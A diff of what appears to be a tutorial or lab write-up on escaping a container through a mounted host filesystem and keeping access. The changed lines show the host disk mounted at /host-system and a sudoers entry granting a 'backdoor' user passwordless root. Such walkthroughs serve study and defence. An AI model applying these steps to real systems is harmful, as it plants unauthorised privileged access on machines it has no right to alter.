@@ -20,7 +20,7 @@ mount | grep 'host' | head
 At the top of the mount entries, there is a `/host-system` folder that seems to link to the host machine.
 
 ```
-tmpfs on /host-system type tmpfs (rw,relatime,size=7318352k)
+/dev/vda1 on /host-system type ext4 (rw,relatime,discard,errors=no-relo)
 # ...
 ```
 ```sh
@@ -90,11 +90,10 @@ Next, we need to give the backdoor user permission to use `sudo` so that they ca
 visudo
 ```
 
-Move to the bottom of the file, press `o` to open a new line, then add the `backdoor` line like this:
+Press `o` to open a new line, then add the `backdoor` user like this:
 
 ```
-root ALL=(ALL) ALL
-%wheel ALL=(ALL) NOPASSWD: ALL
+# add this line
 backdoor ALL=(ALL) NOPASSWD: ALL
 ```
 
